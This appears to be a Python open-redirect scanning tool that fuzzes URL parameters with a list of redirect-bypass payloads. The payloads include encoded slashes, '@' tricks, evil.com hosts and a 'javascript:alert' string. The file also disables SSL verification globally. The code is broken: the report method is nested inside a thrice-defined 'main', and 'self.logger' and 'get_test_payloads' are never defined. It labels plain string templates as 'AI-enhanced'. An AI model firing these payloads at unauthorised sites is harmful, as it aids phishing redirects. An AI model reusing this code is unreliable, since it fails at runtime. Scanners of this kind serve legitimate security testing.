#!/usr/bin/env python3
"""
Open Redirect Detection Agent
Combines features from Oralyzer and OpenRedireX with AI-enhanced capabilities
"""

import asyncio
import aiohttp
import re
import random
import ssl
import warnings
import json
import time
import hashlib
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote
from bs4 import BeautifulSoup
from enum import Enum
import logging
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.text import Text
from rich import box

# Disable SSL warnings
warnings.filterwarnings('ignore')
ssl._create_default_https_context = ssl._create_unverified_context

# Initialize Rich console
console = Console()

class VulnerabilityLevel(Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"

class RedirectType(Enum):
    HEADER_BASED = "Header-Based"
    JAVASCRIPT_BASED = "JavaScript-Based"
    META_TAG_BASED = "Meta-Tag-Based"
    FORM_BASED = "Form-Based"

@dataclass
class RedirectVulnerability:
    url: str
    payload: str
    redirect_type: RedirectType
    final_destination: str
    vulnerability_level: VulnerabilityLevel
    response_code: int
    sources_sinks: List[str] = field(default_factory=list)
    redirect_chain: List[str] = field(default_factory=list)
    confidence_score: float = 0.0
    timestamp: str = field(default_factory=lambda: time.strftime("%Y-%m-%d %H:%M:%S"))

class OpenRedirectAgent:
    def __init__(self, 
                 max_concurrent: int = 50,
                 timeout: int = 10,
                 user_agent: str = "OpenRedirectAgent/1.0",
                 enable_ai_payloads: bool = True):
        
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.user_agent = user_agent
        self.enable_ai_payloads = enable_ai_payloads
        
        # Enhanced payload database combining both tools
        self.base_payloads = self._load_base_payloads()
        self.ai_generated_payloads = []
        
        # JavaScript sources and sinks for detection
        self.sources_sinks = [
            "location.href", "location.hash", "location.search", "location.pathname",
            "document.URL", "window.name", "document.referrer", "document.documentURI",
            "document.baseURI", "location.hostname", "location.replace", "location.assign",
            "window.open", "iframe.src", "jQuery.attr.href", "element.setAttribute.href",
            "history.pushState", "history.replaceState", "anchor.href"
        ]
        
        # Vulnerability patterns
        self.vulnerability_patterns = {
            'high_risk_domains': ['evil.com', 'attacker.com', 'malicious.site'],
            'suspicious_protocols': ['javascript:', 'data:', 'vbscript:'],
            'bypass_patterns': ['@', '%2f..', '%2e%2e', '/\\', '///', '////']
        }
        
        self.findings: List[RedirectVulnerability] = []
        self.tested_urls: Set[str] = set()
        
    def display_banner(self):
        """Display tool banner"""
        banner = """
[bold red]
 ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
[/bold red]
[bold cyan]                        🔍 Advanced Open Redirect Detection Agent 🔍[/bold cyan]
[dim]                                  Enhanced with AI Capabilities[/dim]
        """
        console.print(Panel(banner, box=box.DOUBLE))

    def display_scan_start(self, url: str):
        """Display scan start information"""
        console.print(f"\n[bold green]🎯 TARGET:[/bold green] [cyan]{url}[/cyan]")
        console.print("[bold yellow]⚡ Initializing scan...[/bold yellow]")

    def display_progress(self, current: int, total: int, payload: str):
        """Display current progress"""
        progress = (current / total) * 100
        console.print(f"[dim]Testing payload [{current}/{total}] ({progress:.1f}%): {payload[:50]}...[/dim]", end='\r')

    def display_vulnerability_found(self, vuln: 'RedirectVulnerability'):
        """Display vulnerability as it's found"""
        severity_colors = {
            VulnerabilityLevel.CRITICAL: "bold red",
            VulnerabilityLevel.HIGH: "red", 
            VulnerabilityLevel.MEDIUM: "yellow",
            VulnerabilityLevel.LOW: "blue"
        }
        
        type_icons = {
            RedirectType.HEADER_BASED: "🔗",
            RedirectType.JAVASCRIPT_BASED: "⚡",
            RedirectType.META_TAG_BASED: "🏷️",
            RedirectType.FORM_BASED: "📝"
        }
        
        severity_color = severity_colors.get(vuln.vulnerability_level, "white")
        type_icon = type_icons.get(vuln.redirect_type, "🔍")
        
        console.print(f"\n[{severity_color}]🚨 VULNERABILITY FOUND![/{severity_color}]")
        console.print(f"{type_icon} Type: [{severity_color}]{vuln.redirect_type.value}[/{severity_color}]")
        console.print(f"🎯 Payload: [cyan]{vuln.payload}[/cyan]")
        console.print(f"📍 Redirects to: [magenta]{vuln.final_destination}[/magenta]")
        console.print(f"⚠️  Severity: [{severity_color}]{vuln.vulnerability_level.value}[/{severity_color}]")
        console.print(f"🎲 Confidence: [green]{vuln.confidence_score:.2f}[/green]")

    def display_results(self, results: Dict[str, Any]):
        """Display comprehensive scan results"""
        
        # Handle failed scans
        if results.get('status') == 'FAILED':
            console.print(f"\n[bold red]❌ SCAN FAILED[/bold red]")
            console.print(f"[red]Error: {results.get('error', 'Unknown error')}[/red]")
            console.print(f"\n[bold yellow]💡 TROUBLESHOOTING TIPS:[/bold yellow]")
            console.print("1. Check if the target URL is accessible in your browser")
            console.print("2. Verify the URL contains parameters to test (e.g., ?url=, ?redirect=)")
            console.print("3. Try testing with different parameter names")
            console.print("4. Check if the site blocks automated requests")
            console.print("5. Ensure the site supports the tested redirect methods")
            return

        # Summary table
        table = Table(title="🎯 OPEN REDIRECT SCAN RESULTS", border_style="red", box=box.DOUBLE)
        table.add_column("Parameter", style="cyan", width=20)
        table.add_column("Value", style="white", width=50)
        
        table.add_row("Target URL", results['target'])
        table.add_row("Scan Duration", results['duration'])
        table.add_row("Payloads Tested", str(results['payloads_tested']))
        table.add_row("Total Vulnerabilities", str(len(results['vulnerabilities'])))
        table.add_row("Critical Findings", str(results['severity_breakdown']['critical']))
        table.add_row("High Risk Findings", str(results['severity_breakdown']['high']))
        table.add_row("Medium Risk Findings", str(results['severity_breakdown']['medium']))
        table.add_row("Low Risk Findings", str(results['severity_breakdown']['low']))
        table.add_row("Status", f"[green]{results['status']}[/green]")
        
        console.print(table)

        # Display vulnerabilities if found
        if results['vulnerabilities']:
            console.print(f"\n[bold red]🚨 DETAILED VULNERABILITY REPORT:[/bold red]")
            
            vuln_table = Table(border_style="red", box=box.ROUNDED)
            vuln_table.add_column("🔍 Type", style="cyan", width=18)
            vuln_table.add_column("⚠️ Severity", style="red", width=12)
            vuln_table.add_column("🎯 Payload", style="yellow", width=30)
            vuln_table.add_column("📍 Destination", style="magenta", width=35)
            vuln_table.add_column("🎲 Confidence", style="green", width=10)
            
            for vuln in results['vulnerabilities']:
                severity_style = {
                    'CRITICAL': '[bold red]CRITICAL[/bold red]',
                    'HIGH': '[red]HIGH[/red]',
                    'MEDIUM': '[yellow]MEDIUM[/yellow]',
                    'LOW': '[blue]LOW[/blue]'
                }.get(vuln.vulnerability_level.value, vuln.vulnerability_level.value)
                
                # Truncate long values
                payload_display = (vuln.payload[:27] + "...") if len(vuln.payload) > 30 else vuln.payload
                dest_display = (vuln.final_destination[:32] + "...") if len(vuln.final_destination) > 35 else vuln.final_destination
                
                vuln_table.add_row(
                    vuln.redirect_type.value,
                    severity_style,
                    payload_display,
                    dest_display,
                    f"{vuln.confidence_score:.2f}"
                )
            
            console.print(vuln_table)
            
            # Show recommendations
            self.display_recommendations(results['vulnerabilities'])
        else:
            console.print(f"\n[bold green]✅ NO VULNERABILITIES FOUND[/bold green]")
            console.print("[dim]The target appears to be secure against open redirect attacks.[/dim]")

    def display_recommendations(self, vulnerabilities: List['RedirectVulnerability']):
        """Display security recommendations"""
        console.print(f"\n[bold yellow]🛡️ SECURITY RECOMMENDATIONS:[/bold yellow]")
        
        recommendations = []
        
        # Check for different vulnerability types
        redirect_types = {vuln.redirect_type for vuln in vulnerabilities}
        severity_levels = {vuln.vulnerability_level for vuln in vulnerabilities}
        
        if RedirectType.HEADER_BASED in redirect_types:
            recommendations.append("• Implement strict whitelist validation for redirect URLs")
            recommendations.append("• Use relative URLs instead of absolute URLs for redirects")
        
        if RedirectType.JAVASCRIPT_BASED in redirect_types:
            recommendations.append("• Sanitize and validate all user input before using in JavaScript")
            recommendations.append("• Implement Content Security Policy (CSP) headers")
        
        if RedirectType.META_TAG_BASED in redirect_types:
            recommendations.append("• Validate URLs before using in meta refresh tags")
            recommendations.append("• Consider using JavaScript redirects with proper validation")
        
        if VulnerabilityLevel.CRITICAL in severity_levels or VulnerabilityLevel.HIGH in severity_levels:
            recommendations.append("• [bold red]URGENT:[/bold red] Patch these vulnerabilities immediately")
            recommendations.append("• Implement server-side URL validation")
            recommendations.append("• Log and monitor redirect attempts")
        
        # General recommendations
        recommendations.extend([
            "• Use a centralized redirect function with built-in validation",
            "• Implement rate limiting on redirect endpoints",
            "• Regular security testing and code reviews"
        ])
        
        for rec in recommendations:
            console.print(rec)

    def _load_base_payloads(self) -> List[str]:
        """Load comprehensive payload database from both tools"""
        return [
            # Basic redirects
            "http://www.google.com",
            "https://www.google.com", 
            "//www.google.com",
            "///www.google.com",
            "////www.google.com",
            
            # Encoded variants
            "http%3A%2F%2Fwww.google.com",
            "https%3A%2F%2Fwww.google.com",
            
            # Protocol manipulation
            "https:www.google.com",
            "HtTP://google.com",
            "htttp://google.com",
            
            # Path traversal
            "//google.com/%2f..",
            "///google.com/%2f..",
            "////google.com/%2f..",
            "//google.com/%2e%2e",
            "//google.com/%2f%2e%2e",
            
            # Advanced bypasses
            "//example.com@google.com/%2f..",
            "/https://google.com/%2f..",
            "/%2f%2fgoogle.com",
            "/%5cgoogle.com",
            "/%09/google.com",
            
            # IP address variants
            "//216.58.214.206",
            "http://[::ffff:216.58.214.206]",
            "http://0xd8.0x3a.0xd6.0xce",
            
            # Unicode and encoding bypasses
            "//google。com",
            "//google%E3%80%82com",
            "http\\x3A\\x2F\\x2Fgoogle.com",
            
            # Form-based redirects
            "/https://example.com",
            "/https://example.com/",
            "/https://example.com/%2e%2e",
            "/https://example.com/%2f%2e%2e",
            
            # Special characters
            "////\\;@google.com",
            "/////google.com",
            "/.google.com"
        ]

    async def generate_ai_payloads(self, target_domain: str, existing_params: List[str]) -> List[str]:
        """Generate AI-enhanced payloads based on target analysis"""
        if not self.enable_ai_payloads:
            return []
            
        ai_payloads = []
        parsed_target = urlparse(target_domain)
        base_domain = parsed_target.netloc
        
        # Generate domain-specific payloads
        for technique in ['subdomain', 'path', 'parameter', 'encoding']:
            ai_payloads.extend(self._generate_technique_payloads(base_domain, technique))
        
        # Parameter-specific payloads
        for param in existing_params:
            ai_payloads.extend(self._generate_param_specific_payloads(param))
            
        return ai_payloads[:50]  # Limit AI-generated payloads

    def _generate_technique_payloads(self, domain: str, technique: str) -> List[str]:
        """Generate payloads using specific techniques"""
        payloads = []
        
        if technique == 'subdomain':
            payloads.extend([
                f"//evil.{domain}",
                f"//attacker.{domain}",
                f"//{domain}.evil.com"
            ])
        elif technique == 'path':
            payloads.extend([
                f"//{domain}/../evil.com",
                f"//{domain}/../../evil.com",
                f"//{domain}/%2e%2e/evil.com"
            ])
        elif technique == 'parameter':
            payloads.extend([
                f"//{domain}?redirect=evil.com",
                f"//{domain}#evil.com",
                f"//{domain};evil.com"
            ])
        elif technique == 'encoding':
            encoded_domain = quote(f"http://evil.com", safe='')
            payloads.extend([
                f"//{encoded_domain}",
                f"//evil%2ecom",
                f"//evil%u002ecom"
            ])
            
        return payloads

    def _generate_param_specific_payloads(self, param: str) -> List[str]:
        """Generate payloads specific to parameter names"""
        common_evil = "http://evil.com"
        
        if any(word in param.lower() for word in ['url', 'redirect', 'next', 'return']):
            return [
                common_evil,
                f"//{urlparse(common_evil).netloc}",
                quote(common_evil),
                f"javascript:alert('XSS')//{urlparse(common_evil).netloc}"
            ]
        return [common_evil]

    def fuzzify_url(self, url: str, keyword: str = "FUZZ") -> str:
        """Replace URL parameters with fuzz keyword"""
        if keyword in url:
            return url
            
        parsed_url = urlparse(url)
        params = parse_qsl(parsed_url.query)
        fuzzed_params = [(k, keyword) for k, _ in params]
        fuzzed_query = urlencode(fuzzed_params)
        
        return urlunparse([
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, fuzzed_query, parsed_url.fragment
        ])

    async def analyze_single_url(self, session: aiohttp.ClientSession, 
                                base_url: str, payload: str) -> Optional[RedirectVulnerability]:
        """Analyze a single URL with a specific payload"""
        
        test_url = base_url.replace("FUZZ", payload)
        
        if test_url in self.tested_urls:
            return None
            
        self.tested_urls.add(test_url)
        
        try:
            async with session.get(test_url, 
                                 allow_redirects=False, 
                                 timeout=self.timeout) as response:
                
                return await self._analyze_response(response, test_url, payload)
                
        except Exception as e:
            self.logger.debug(f"Error testing {test_url}: {str(e)}")
            return None

    async def _analyze_response(self, response: aiohttp.ClientResponse, 
                               test_url: str, payload: str) -> Optional[RedirectVulnerability]:
        """Analyze HTTP response for open redirect vulnerabilities"""
        
        vulnerability = None
        redirect_type = None
        final_destination = ""
        sources_sinks = []
        confidence_score = 0.0
        
        # Check for header-based redirects
        if response.status in range(300, 400):
            location = response.headers.get('Location', '')
            if location:
                redirect_type = RedirectType.HEADER_BASED
                final_destination = location
                confidence_score = self._calculate_confidence_score(payload, location, 'header')
                
        # Check response body for other redirect types
        elif response.status == 200:
            try:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Check for JavaScript-based redirects
                js_redirect = self._check_javascript_redirect(content, payload)
                if js_redirect:
                    redirect_type = RedirectType.JAVASCRIPT_BASED
                    final_destination = js_redirect['destination']
                    sources_sinks = js_redirect['sources_sinks']
                    confidence_score = self._calculate_confidence_score(payload, final_destination, 'javascript')
                
                # Check for meta tag redirects
                meta_redirect = self._check_meta_redirect(soup, payload)
                if meta_redirect:
                    redirect_type = RedirectType.META_TAG_BASED
                    final_destination = meta_redirect
                    confidence_score = self._calculate_confidence_score(payload, final_destination, 'meta')
                    
            except Exception as e:
                self.logger.debug(f"Error parsing response content: {str(e)}")
        
        # Create vulnerability object if redirect found
        if redirect_type and final_destination:
            vulnerability_level = self._assess_vulnerability_level(payload, final_destination, confidence_score)
            
            vulnerability = RedirectVulnerability(
                url=test_url,
                payload=payload,
                redirect_type=redirect_type,
                final_destination=final_destination,
                vulnerability_level=vulnerability_level,
                response_code=response.status,
                sources_sinks=sources_sinks,
                confidence_score=confidence_score
            )
            
        return vulnerability

    def _check_javascript_redirect(self, content: str, payload: str) -> Optional[Dict[str, Any]]:
        """Check for JavaScript-based redirects"""
        payload_pattern = re.escape(payload)
        
        # Look for the payload in JavaScript code
        if re.search(payload_pattern, content, re.IGNORECASE):
            # Find relevant sources/sinks
            found_sources = []
            for source in self.sources_sinks:
                if source in content:
                    found_sources.append(source)
            
            # Try to extract the redirect destination
            redirect_patterns = [
                r'location\.href\s*=\s*["\']([^"\']+)["\']',
                r'window\.location\s*=\s*["\']([^"\']+)["\']',
                r'location\.replace\(["\']([^"\']+)["\']\)',
                r'window\.open\(["\']([^"\']+)["\']\)'
            ]
            
            for pattern in redirect_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match and payload in match.group(1):
                    return {
                        'destination': match.group(1),
                        'sources_sinks': found_sources
                    }
        
        return None

    def _check_meta_redirect(self, soup: BeautifulSoup, payload: str) -> Optional[str]:
        """Check for meta tag redirects"""
        meta_tags = soup.find_all('meta', attrs={'http-equiv': 'refresh'})
        
        for meta in meta_tags:
            content = meta.get('content', '')
            if payload in content:
                # Extract URL from content attribute (format: "delay;url=...")
                url_match = re.search(r'url=([^;]+)', content, re.IGNORECASE)
                if url_match:
                    return url_match.group(1)
        
        return None

    def _calculate_confidence_score(self, payload: str, destination: str, redirect_type: str) -> float:
        """Calculate confidence score for the vulnerability"""
        score = 0.0
        
        # Base score by redirect type
        type_scores = {'header': 0.9, 'javascript': 0.7, 'meta': 0.8}
        score += type_scores.get(redirect_type, 0.5)
        
        # Check if payload is reflected in destination
        if payload in destination:
            score += 0.3
        
        # Check for bypass techniques
        for pattern in self.vulnerability_patterns['bypass_patterns']:
            if pattern in payload:
                score += 0.1
        
        # Check for suspicious protocols
        for protocol in self.vulnerability_patterns['suspicious_protocols']:
            if protocol in destination.lower():
                score += 0.2
        
        return min(score, 1.0)

    def _assess_vulnerability_level(self, payload: str, destination: str, confidence: float) -> VulnerabilityLevel:
        """Assess the vulnerability level"""
        
        # Critical: External domain redirect with high confidence
        if confidence >= 0.8 and self._is_external_redirect(destination):
            return VulnerabilityLevel.CRITICAL
        
        # High: External redirect or dangerous protocols
        if (confidence >= 0.6 and self._is_external_redirect(destination)) or \
           any(proto in destination.lower() for proto in self.vulnerability_patterns['suspicious_protocols']):
            return VulnerabilityLevel.HIGH
        
        # Medium: Suspicious patterns
        if confidence >= 0.5 or any(pattern in payload for pattern in self.vulnerability_patterns['bypass_patterns']):
            return VulnerabilityLevel.MEDIUM
        
        return VulnerabilityLevel.LOW

    def _is_external_redirect(self, destination: str) -> bool:
        """Check if redirect points to external domain"""
        try:
            parsed = urlparse(destination)
            return bool(parsed.netloc and '.' in parsed.netloc)
        except:
            return False

    async def scan_url(self, url: str) -> Dict[str, Any]:
        """Main scanning method for a single URL with enhanced reporting"""
        start_time = time.time()
        
        self.display_banner()
        self.display_scan_start(url)
        
        try:
            # Prepare URL for fuzzing
            fuzzed_url = self.fuzzify_url(url)
            if "FUZZ" not in fuzzed_url:
                return {
                    'status': 'FAILED',
                    'target': url,
                    'error': 'No parameters found to fuzz. URL should contain parameters like ?url=, ?redirect=, ?next=',
                    'duration': f"{time.time() - start_time:.2f}s"
                }
            
            # Generate payloads
            all_payloads = self.base_payloads.copy()
            
            if self.enable_ai_payloads:
                parsed_url = urlparse(url)
                params = [k for k, v in parse_qsl(parsed_url.query)]
                ai_payloads = await self.generate_ai_payloads(url, params)
                all_payloads.extend(ai_payloads)
            
            console.print(f"[bold blue]🧪 Testing with {len(all_payloads)} payloads...[/bold blue]")
            
            # Create session
            connector = aiohttp.TCPConnector(limit=self.max_concurrent)
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            
            vulnerabilities = []
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={'User-Agent': self.user_agent}
            ) as session:
                
                # Create semaphore for concurrency control
                semaphore = asyncio.Semaphore(self.max_concurrent)
                
                # Progress tracking
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TimeElapsedColumn(),
                    console=console
                ) as progress:
                    
                    task = progress.add_task("Scanning for vulnerabilities...", total=len(all_payloads))
                    
                    # Create tasks
                    tasks = []
                    for i, payload in enumerate(all_payloads):
                        task_coro = self._scan_with_progress(semaphore, session, fuzzed_url, payload, progress, task)
                        tasks.append(task_coro)
                    
                    # Execute tasks
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Filter valid results and display them
                    for result in results:
                        if isinstance(result, RedirectVulnerability):
                            vulnerabilities.append(result)
                            self.display_vulnerability_found(result)
            
            # Calculate duration
            duration = f"{time.time() - start_time:.2f}s"
            
            # Create severity breakdown
            severity_breakdown = {
                'critical': len([v for v in vulnerabilities if v.vulnerability_level == VulnerabilityLevel.CRITICAL]),
                'high': len([v for v in vulnerabilities if v.vulnerability_level == VulnerabilityLevel.HIGH]),
                'medium': len([v for v in vulnerabilities if v.vulnerability_level == VulnerabilityLevel.MEDIUM]),
                'low': len([v for v in vulnerabilities if v.vulnerability_level == VulnerabilityLevel.LOW])
            }
            
            # Store findings
            self.findings.extend(vulnerabilities)
            
            # Prepare results
            results = {
                'status': 'SUCCESS',
                'target': url,
                'duration': duration,
                'payloads_tested': len(all_payloads),
                'vulnerabilities': vulnerabilities,
                'severity_breakdown': severity_breakdown
            }
            
            # Display results
            self.display_results(results)
            
            return results
            
        except Exception as e:
            return {
                'status': 'FAILED',
                'target': url,
                'error': str(e),
                'duration': f"{time.time() - start_time:.2f}s"
            }

    async def _scan_with_progress(self, semaphore: asyncio.Semaphore, 
                                 session: aiohttp.ClientSession, 
                                 url: str, payload: str,
                                 progress: Progress, task_id) -> Optional[RedirectVulnerability]:
        """Scan with progress tracking"""
        async with semaphore:
            result = await self.analyze_single_url(session, url, payload)
            progress.advance(task_id)
            return result

    async def scan_multiple_urls(self, urls: List[str]) -> Dict[str, Dict[str, Any]]:
        """Scan multiple URLs with enhanced reporting"""
        results = {}
        
        console.print(f"\n[bold cyan]🎯 SCANNING {len(urls)} TARGETS[/bold cyan]")
        
        for i, url in enumerate(urls, 1):
            console.print(f"\n[bold yellow]📍 Target {i}/{len(urls)}[/bold yellow]")
            try:
                result = await self.scan_url(url)
                results[url] = result
            except Exception as e:
                console.print(f"[red]❌ Error scanning {url}: {str(e)}[/red]")
                results[url] = {
                    'status': 'FAILED',
                    'target': url,
                    'error': str(e),
                    'duration': '0.00s'
                }
        
        # Display summary
        self.display_multi_scan_summary(results)
        return results

    def display_multi_scan_summary(self, results: Dict[str, Dict[str, Any]]):
        """Display summary of multiple scans"""
        console.print(f"\n[bold green]📊 MULTI-SCAN SUMMARY[/bold green]")
        
        summary_table = Table(border_style="green", box=box.ROUNDED)
        summary_table.add_column("Target", style="cyan", width=40)
        summary_table.add_column("Status", style="white", width=12)
        summary_table.add_column("Vulnerabilities", style="red", width=15)
        summary_table.add_column("Highest Severity", style="yellow", width=15)
        
        total_vulns = 0
        for url, result in results.items():
            if result['status'] == 'SUCCESS':
                vuln_count = len(result['vulnerabilities'])
                total_vulns += vuln_count
                
                # Find highest severity
                if result['vulnerabilities']:
                    severities = [v.vulnerability_level for v in result['vulnerabilities']]
                    if VulnerabilityLevel.CRITICAL in severities:
                        highest = "[bold red]CRITICAL[/bold red]"
                    elif VulnerabilityLevel.HIGH in severities:
                        highest = "[red]HIGH[/red]"
                    elif VulnerabilityLevel.MEDIUM in severities:
                        highest = "[yellow]MEDIUM[/yellow]"
                    else:
                        highest = "[blue]LOW[/blue]"
                else:
                    highest = "[green]NONE[/green]"
                
                summary_table.add_row(
                    url[:37] + "..." if len(url) > 40 else url,
                    "[green]SUCCESS[/green]",
                    str(vuln_count),
                    highest
                )
            else:
                summary_table.add_row(
                    url[:37] + "..." if len(url) > 40 else url,
                    "[red]FAILED[/red]",
                    "N/A",
                    "N/A"
                )
        
        console.print(summary_table)
        console.print(f"\n[bold cyan]Total Vulnerabilities Found: {total_vulns}[/bold cyan]")

# Test URLs and Demo Function
def get_demo_urls() -> List[str]:
    """Get demo URLs for testing (replace with real vulnerable test sites)"""
    return [
        # Replace these with actual test URLs from your environment
        "https://httpbin.org/redirect-to?url=FUZZ",  # HTTP testing service
        "https://example.com/redirect?next=FUZZ",    # Example URLs
        "https://example.com/forward?destination=FUZZ",
        "https://example.com/goto?url=FUZZ"
    ]

async def demo_scan():
    """Demo function showing how to use the agent"""
    console.print("[bold green]🚀 OPEN REDIRECT AGENT DEMO[/bold green]")
    console.print("[dim]Note: Replace demo URLs with actual test targets[/dim]\n")
    
    # Initialize agent
    agent = OpenRedirectAgent(
        max_concurrent=10,
        timeout=5,
        enable_ai_payloads=True
    )
    
    # Demo single URL scan
    console.print("[bold yellow]📍 SINGLE URL SCAN DEMO[/bold yellow]")
    demo_url = "https://httpbin.org/redirect-to?url=FUZZ"
    result = await agent.scan_url(demo_url)
    
    # Save report
    if result['status'] == 'SUCCESS':
        report = agent.generate_report('json')
        with open('demo_scan_report.json', 'w') as f:
            f.write(report)
        console.print(f"\n[green]✅ Report saved to demo_scan_report.json[/green]")
    
    # Demo payload testing
    console.print(f"\n[bold yellow]🧪 AVAILABLE TEST PAYLOADS ({len(agent.get_test_payloads())})[/bold yellow]")
    for i, payload in enumerate(agent.get_test_payloads()[:10], 1):
        console.print(f"  {i}. {payload}")
    console.print(f"  ... and {len(agent.get_test_payloads()) - 10} more")

# Example usage
async def main():
    """Main function demonstrating the agent usage"""
    
    # Run demo
    await demo_scan()
    
    # For real testing, use your own URLs:
    # agent = OpenRedirectAgent()
    # result = await agent.scan_url("https://your-target.com/redirect?url=FUZZ")
    # print(agent.generate_report('json'))

    def generate_report(self, format: str = 'json') -> str:
        """Generate vulnerability report"""
        
        if format.lower() == 'json':
            report_data = {
                'scan_summary': {
                    'total_findings': len(self.findings),
                    'critical': len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.CRITICAL]),
                    'high': len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.HIGH]),
                    'medium': len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.MEDIUM]),
                    'low': len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.LOW])
                },
                'vulnerabilities': [
                    {
                        'url': vuln.url,
                        'payload': vuln.payload,
                        'type': vuln.redirect_type.value,
                        'destination': vuln.final_destination,
                        'level': vuln.vulnerability_level.value,
                        'confidence': vuln.confidence_score,
                        'sources_sinks': vuln.sources_sinks,
                        'timestamp': vuln.timestamp
                    }
                    for vuln in self.findings
                ]
            }
            return json.dumps(report_data, indent=2)
        
        # Text format
        report = "OPEN REDIRECT VULNERABILITY REPORT\n"
        report += "=" * 50 + "\n\n"
        
        # Summary
        report += f"Total Vulnerabilities Found: {len(self.findings)}\n"
        report += f"Critical: {len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.CRITICAL])}\n"
        report += f"High: {len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.HIGH])}\n"
        report += f"Medium: {len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.MEDIUM])}\n"
        report += f"Low: {len([f for f in self.findings if f.vulnerability_level == VulnerabilityLevel.LOW])}\n\n"
        
        # Detailed findings
        for i, vuln in enumerate(self.findings, 1):
            report += f"Finding #{i}\n"
            report += f"URL: {vuln.url}\n"
            report += f"Payload: {vuln.payload}\n"
            report += f"Type: {vuln.redirect_type.value}\n"
            report += f"Destination: {vuln.final_destination}\n"
            report += f"Severity: {vuln.vulnerability_level.value}\n"
            report += f"Confidence: {vuln.confidence_score:.2f}\n"
            if vuln.sources_sinks:
                report += f"Sources/Sinks: {', '.join(vuln.sources_sinks)}\n"
            report += f"Timestamp: {vuln.timestamp}\n"
            report += "-" * 30 + "\n\n"
        
        return report

# Example usage
async def main():
    """Example usage of the OpenRedirectAgent"""
    
    # Initialize agent
    agent = OpenRedirectAgent(
        max_concurrent=20,
        timeout=10,
        enable_ai_payloads=True
    )
    
    # Test URLs (replace with actual URLs)
    test_urls = [
        "https://example.com/redirect?url=FUZZ",
        "https://example.com/forward?next=FUZZ",
        "https://example.com/goto?destination=FUZZ"
    ]
    
    # Scan URLs
    results = await agent.scan_multiple_urls(test_urls)
    
    # Generate report
    report = agent.generate_report('json')
    print(report)
    
    # Save report
    with open('redirect_scan_report.json', 'w') as f:
        f.write(report)

# Example usage
async def main():
    """Main function demonstrating the agent usage"""
    
    # Run demo
    await demo_scan()
    
    # For real testing, use your own URLs:
    # agent = OpenRedirectAgent()
    # result = await agent.scan_url("https://your-target.com/redirect?url=FUZZ")
    # print(agent.generate_report('json'))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Scan interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error: {str(e)}[/red]")